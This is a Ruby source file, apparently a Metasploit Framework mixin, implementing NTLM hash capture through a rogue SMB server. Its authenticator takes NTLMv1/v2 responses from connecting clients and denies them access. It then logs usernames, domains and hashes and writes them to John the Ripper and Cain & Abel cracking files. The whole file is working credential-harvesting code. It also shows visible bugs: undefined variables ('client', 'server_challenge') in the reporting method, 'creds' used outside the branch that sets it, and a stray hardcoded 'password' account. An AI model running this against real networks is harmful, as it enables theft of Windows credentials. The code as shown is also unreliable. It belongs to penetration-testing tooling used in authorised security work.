module Msf

  ###
  #
  # This mixin provides support for reporting captured SMB creds
  #
  ###

  module Exploit::SMBHashCapture

    include ::Msf::Auxiliary::Report

    def validate_smb_hash_capture_datastore(datastore, ntlm_provider)
      if datastore['CHALLENGE']
        # Set challenge for all future server responses

        chall = proc { [datastore['CHALLENGE']].pack('H*') }
        ntlm_provider.generate_server_challenge(&chall)
      end

      if datastore['JOHNPWFILE']
        print_status("JTR hashes will be split into two files depending on the hash format.")
        print_status("#{build_jtr_file_name(JTR_NTLMV1)} for NTLMv1 hashes.")
        print_status("#{build_jtr_file_name(JTR_NTLMV2)} for NTLMv2 hashes.")
        print_line
      end

      if datastore['CAINPWFILE']
        print_status("Cain & Abel hashes will be stored at #{File.expand_path(datastore['CAINPWFILE'], Msf::Config.install_root)}")
        print_line
      end
    end

    def report_ntlm_type3(address:, challenge:, client_os_version:, ntlm_message:)
      hash_type = nil
      combined_hash = "#{ntlm_message.user.encode}::#{ntlm_message.domain.encode}"

      case ntlm_message.ntlm_version
      when :ntlmv1
        hash_type = 'NTLMv1-SSP'
        client_hash = "#{bin_to_hex(ntlm_message.lm_response)}:#{bin_to_hex(ntlm_message.ntlm_response)}"

        combined_hash << ":#{client_hash}"
        combined_hash << ":#{bin_to_hex(challenge)}"
      when :ntlmv2
        hash_type = 'NTLMv2-SSP'
        client_hash = "#{bin_to_hex(ntlm_message.ntlm_response[0...16])}:#{bin_to_hex(ntlm_message.ntlm_response[16..-1])}"

        combined_hash << ":#{bin_to_hex(challenge)}"
        combined_hash << ":#{client_hash}"
      end

      return if hash_type.nil?

      print_line "[SMB] #{hash_type} Client     : #{address}"
      # print_line "[SMB] #{hash_type} Client OS  : #{@client_os_version}"
      print_line "[SMB] #{hash_type} Username   : #{ntlm_message.domain.encode}\\#{ntlm_message.user.encode}"
      print_line "[SMB] #{hash_type} Hash       : #{combined_hash}"
      print_line

      jtr_format = ntlm_message.ntlm_version == :ntlmv1 ? JTR_NTLMV1 : JTR_NTLMV2

      if active_db?
        creds = {
          address: client,
          combined_hash: combined_hash,
          jtr_format: jtr_format,
          username: ntlm_message.user.encode,
          server_challenge: server_challenge,
          client_hash: client_hash,
          domain: ntlm_message.domain.encode,
          client_os_version: client_os_version,
          realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
          realm_value: ntlm_message.domain.encode
        }

        origin = create_credential_origin_service(
          {
            address: creds[:address],
            port: datastore['SRVPORT'],
            service_name: 'smb',
            protocol: 'tcp',
            module_fullname: fullname,
            workspace_id: myworkspace_id
          }
        )

        # TODO: Re-implement when +creds[:client_os_version]+ can be determined.
        # found_host = framework.db.hosts.find_by(address: address)
        # found_host.os_name = creds[:client_os_version]
        # found_host.save!

        ntlm_provider = RubySMB::Gss::Provider::NTLM.new(allow_anonymous: true)
        ntlm_provider.put_account('RubySMB', 'password')  # password can also be an NTLM hash

        create_credential(
          {
            origin: origin,
            origin_type: :service,
            address: creds[:address],
            service_name: 'smb',
            port: datastore['SRVPORT'],
            private_data: creds[:combined_hash],
            private_type: :nonreplayable_hash,
            jtr_format: creds[:jtr_format],
            username: creds[:username],
            module_fullname: fullname,
            workspace_id: myworkspace_id,
            realm_key: creds[:realm_key],
            realm_value: creds[:realm_value]
          }
        )
      end

      if datastore['JOHNPWFILE']
        path = build_jtr_file_name(creds[:jtr_format])

        File.open(path, 'ab') do |f|
          f.puts(creds[:combined_hash])
        end
      end

      # Cain & Abel doesn't support import of NTLMv2 hashes
      if datastore['CAINPWFILE'] && creds[:jtr_format] == JTR_NTLMV1
        # Cain&Abel hash format
        # Username:Domain:Challenge:LMHash:NTLMHash
        File.open(File.expand_path(datastore['CAINPWFILE'], Msf::Config.install_root), 'ab') do |f|
          f.puts("#{creds[:username]}:#{creds[:domain]}:#{creds[:server_challenge]}:#{creds[:client_hash]}")
        end
      end
    end

    def build_jtr_file_name(jtr_format)
      # JTR NTLM hash format NTLMv1
      # Username::Domain:LMHash:NTHash:Challenge
      #
      # JTR NTLM hash format NTLMv2
      # Username::Domain:Challenge:NTHash[0...16]:NTHash[16...-1]

      path = File.expand_path(datastore['JOHNPWFILE'], Msf::Config.install_root)

      # if the passed file name does not contain an extension
      if File.extname(File.basename(path)).empty?
        path += "_#{jtr_format}"
      else
        path_parts = path.split('.')

        # inserts _jtr_format between the last extension and the rest of the path
        path = "#{path_parts[0...-1].join('.')}_#{jtr_format}.#{path_parts[-1]}"
      end

      path
    end

    def bin_to_hex(str)
      str.each_byte.map { |b| b.to_s(16).rjust(2, '0') }.join
    end

    class HashCaptureNTLMProvider < RubySMB::Gss::Provider::NTLM
      def initialize(allow_anonymous: false, default_domain: 'WORKGROUP', listener: nil)
        super(allow_anonymous: allow_anonymous, default_domain: default_domain)
        @listener = listener
      end

      # Needs overwritten to ensure our version of Authenticator is returned
      def new_authenticator(server_client)
        # build and return an instance that can process and track stateful information for a particular connection but
        # that's backed by this particular provider
        HashCaptureAuthenticator.new(self, server_client)
      end

      attr_reader :listener
    end

    class HashCaptureAuthenticator < RubySMB::Gss::Provider::NTLM::Authenticator
      def process_ntlm_type1(type1_msg)
        @client_os_version = type1_msg.os_version
        # TODO: write method for mapping +major+ and +minor+ OS values to human-readable OS names.
        # @client_os_version = ::NTLM::OSVersion.read(type1_msg.os_version)
        super
      end

      def process_ntlm_type3(type3_msg)
        _, client = ::Socket.unpack_sockaddr_in(@server_client.getpeername)

        if @provider.listener
          @provider.listener.on_ntlm_type3(
            client: client,
            client_os_version: @client_os_version,
            challenge: @server_challenge,
            ntlm_message: type3_msg,
          )
        end
        ::WindowsError::NTStatus::STATUS_ACCESS_DENIED
      end
    end
  end

end
